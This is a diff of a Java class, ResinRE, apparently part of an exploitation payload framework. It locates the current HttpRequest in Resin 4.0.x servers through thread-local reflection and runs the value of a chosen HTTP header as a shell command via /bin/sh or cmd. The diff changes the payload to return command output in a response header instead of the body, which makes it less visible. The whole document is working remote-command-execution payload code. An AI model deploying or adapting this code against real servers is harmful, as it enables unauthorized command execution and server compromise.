@@ -10,22 +10,23 @@ import java.lang.reflect.Method;
 
 /**
  * @author Whoopsunix
- *
+ * <p>
  * TargetObject = {com.caucho.env.thread2.ResinThread2}
- *   ---> threadLocals = {java.lang.ThreadLocal$ThreadLocalMap}
- *    ---> table = {class [Ljava.lang.ThreadLocal$ThreadLocalMap$Entry;}
- *     ---> [13] = {java.lang.ThreadLocal$ThreadLocalMap$Entry}
- *      ---> value = {com.caucho.server.http.HttpRequest}
+ * ---> threadLocals = {java.lang.ThreadLocal$ThreadLocalMap}
+ * ---> table = {class [Ljava.lang.ThreadLocal$ThreadLocalMap$Entry;}
+ * ---> [13] = {java.lang.ThreadLocal$ThreadLocalMap$Entry}
+ * ---> value = {com.caucho.server.http.HttpRequest}
  * idea_express: TargetObject.threadLocals.get("table").get("13").get("value")
- *
+ * <p>
  * Version test
- *  [4.0.52, 4.0.66]
+ * [4.0.52, 4.0.66]
  */
 @Middleware(Middleware.Resin)
 @JavaClassType(JavaClassType.Default)
-@JavaClassModifiable({JavaClassModifiable.HEADER})
+@JavaClassModifiable({JavaClassModifiable.HEADER, JavaClassModifiable.RHEADER})
 public class ResinRE {
     private static String HEADER;
+    private static String RHEADER;
 
     public ResinRE() {
         try {
@@ -43,14 +44,18 @@ public class ResinRE {
                 if (value.getClass().getName().equals("com.caucho.server.http.HttpRequest")) {
                     Object request = value;
                     Object response = invokeMethod(request, "getResponseFacade", new Class[]{}, new Object[]{});
-                    Object header = invokeMethod(request, "getHeader", new Class[]{String.class}, new Object[]{HEADER});
-                    String result = exec((String) header);
-                    invokeMethod(response, "setStatus", new Class[]{Integer.TYPE}, new Object[]{new Integer(200)});
-                    Object writer = invokeMethod(response, "getWriter", new Class[]{}, new Object[]{});
-                    invokeMethod(writer, "write", new Class[]{char[].class, Integer.TYPE, Integer.TYPE}, new Object[]{result.toCharArray(), 0, result.toCharArray().length});
-                    invokeMethod(writer, "close", new Class[]{}, new Object[]{});
-                    invokeMethod(writer, "flush", new Class[]{}, new Object[]{});
-                    return;
+                    String header = (String) invokeMethod(request, "getHeader", new Class[]{String.class}, new Object[]{HEADER});
+                    if (header != null && !header.isEmpty()) {
+                        String result = exec(header);
+                        invokeMethod(response, "setHeader", new Class[]{String.class, String.class}, new Object[]{RHEADER, result});
+
+//                        invokeMethod(response, "setStatus", new Class[]{Integer.TYPE}, new Object[]{new Integer(200)});
+//                        Object writer = invokeMethod(response, "getWriter", new Class[]{}, new Object[]{});
+//                        invokeMethod(writer, "write", new Class[]{char[].class, Integer.TYPE, Integer.TYPE}, new Object[]{result.toCharArray(), 0, result.toCharArray().length});
+//                        invokeMethod(writer, "close", new Class[]{}, new Object[]{});
+//                        invokeMethod(writer, "flush", new Class[]{}, new Object[]{});
+                        return;
+                    }
                 }
             }
 
@@ -83,10 +88,8 @@ public class ResinRE {
             cmd = new String[]{"/bin/sh", "-c", str};
         }
         InputStream inputStream = Runtime.getRuntime().exec(cmd).getInputStream();
-        return exec_result(inputStream);
-    }
 
-    public static String exec_result(InputStream inputStream) throws Exception {
+        // result
         byte[] bytes = new byte[1024];
         int len;
         StringBuilder stringBuilder = new StringBuilder();
@@ -99,7 +102,7 @@ public class ResinRE {
     public static Object invokeMethod(Object obj, String methodName, Class[] argsClass, Object[] args) throws Exception {
         try {
             return invokeMethod(obj.getClass(), obj, methodName, argsClass, args);
-        }catch (Exception e){
+        } catch (Exception e) {
             return invokeMethod(obj.getClass().getSuperclass(), obj, methodName, argsClass, args);
         }
     }
